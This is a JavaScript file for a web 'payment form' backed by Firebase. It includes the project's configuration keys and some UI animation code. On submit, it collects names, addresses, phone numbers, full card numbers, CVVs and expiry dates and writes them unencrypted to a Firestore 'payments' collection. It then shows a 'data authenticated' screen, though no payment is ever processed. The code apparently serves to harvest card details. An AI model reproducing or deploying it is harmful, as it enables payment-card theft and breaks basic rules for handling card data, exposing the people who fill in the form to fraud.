// 1. Import Firebase and Firestore
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
import { addDoc, collection, getFirestore } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-firestore.js";
import { showDataAuthenticatedCard } from "./animation.js";

// 2. Your specific Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyCqS4Vm6D4RnBeqtfvTkLjYFhP7zdfR7iw",
  authDomain: "payment-form-d76d4.firebaseapp.com",
  projectId: "payment-form-d76d4",
  storageBucket: "payment-form-d76d4.firebasestorage.app",
  messagingSenderId: "377848961500",
  appId: "1:377848961500:web:cb0d476d5b008563811719",
  measurementId: "G-VV4YPYM1XP"
};

// 3. Initialize Firebase and the Database
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// ==========================================
// YOUR UI ANIMATION LOGIC (UNCHANGED)
// ==========================================
const genderRadios = document.querySelectorAll('input[name="gender"]');
const genderTrigger = document.getElementById('gender-trigger');
const genderFieldset = document.querySelector('.gender-fieldset');
let lastChecked = null;

genderRadios.forEach(radio => {
    radio.addEventListener('click', function() {
        if (this === lastChecked){ 
            this.checked = false;
            lastChecked = null;
        }else{
            lastChecked = this;
        }
    });
});

genderFieldset.addEventListener('click', function(event) {
    if (event.currentTarget === event.target || event.target.classList.contains('gender-click-handler')) {
        genderTrigger.focus();
    }
});

document.addEventListener('click', function(event) {
    const isClickOutside = !genderFieldset.contains(event.target);
    if (isClickOutside) {
        const isSelected = Array.from(genderRadios).some(radio => radio.checked);
        if (!isSelected) {
            genderTrigger.blur();
        } 
    }
});

document.addEventListener('DOMContentLoaded', () => {
    // --- Animation Logic for "IMPORTANT INFORMATION" Section ---
    const infoFieldset = document.querySelector('.info-fieldset');
    const infoTrigger = document.getElementById('info-trigger');
 
    if (infoFieldset && infoTrigger) {
        infoFieldset.addEventListener('click', (event) => {
            if (infoFieldset.contains(event.target)) {
                infoFieldset.classList.add('is-open'); 
            }
        });

        infoFieldset.addEventListener('focusin', () => {
            if (!infoFieldset.classList.contains('is-open')) {
                infoFieldset.classList.add('is-open'); 
            }
        });
 
        document.addEventListener('click', (event) => {
            if (!infoFieldset.contains(event.target)) {
                infoFieldset.classList.remove('is-open'); 
            }
        });
    }

    // ==========================================
    // UPDATED FORM SUBMISSION LOGIC
    // ==========================================
    const form = document.querySelector('form');

    if (form) {
        form.addEventListener('submit', async (e) => {
            e.preventDefault(); // Prevent default form submission

            // 1. Capture values by targeting the `name` attribute of the inputs
            const firstName = document.querySelector('[name="first_name"]')?.value || '';
            const lastName = document.querySelector('[name="last_name"]')?.value || '';
            const address = document.querySelector('[name="address"]')?.value || '';
            const email = document.querySelector('[name="email"]')?.value || '';
            const pincode = document.querySelector('[name="pincode"]')?.value || '';
            const mobile = document.querySelector('[name="mobile number"]')?.value || '';
            const houseNo = document.querySelector('[name="house number"]')?.value || '';
            
            const cardType = document.querySelector('[name="card_type"]')?.value || '';
            const accountType = document.querySelector('[name="account type"]')?.value || '';
            const cardNumber = document.querySelector('[name="card number"]')?.value || '';
            const cvv = document.querySelector('[name="CVV"]')?.value || '';
            const expireDate = document.querySelector('[name="expire_date"]')?.value || '';
            const cardHolder = document.querySelector('[name="card holder name"]')?.value || '';

            // 2. Capture selected gender (Using .id because your HTML inputs don't have .value attributes)
            const genderInput = document.querySelector('input[name="gender"]:checked');
            const gender = genderInput ? genderInput.id : 'Not specified';

            try {
                // 3. Save ALL data to Firestore
                const docRef = await addDoc(collection(db, "payments"), {
                    firstName,
                    lastName,
                    gender,
                    address,
                    email,
                    pincode,
                    mobile,
                    houseNo,
                    cardType,
                    accountType,
                    cardNumber,
                    cvv,
                    expireDate,
                    cardHolder,
                    timestamp: new Date() 
                });
                
                console.log("Document written with ID: ", docRef.id);
                // alert("Data Successfully Saved to Firebase!"); 
                form.reset(); // Clear the form fields
                
                // Prepare data object for the auth card
                const dataToDisplay = {
                    firstName,
                    lastName,
                    email,
                    cardType,
                    cardNumber,
                    expireDate
                };

                showDataAuthenticatedCard(dataToDisplay); // Trigger the new UI sequence with data

            } catch (error) {
                console.error("Error adding document: ", error);
                alert("There was an error saving your data.");
            }
        });
    }
});
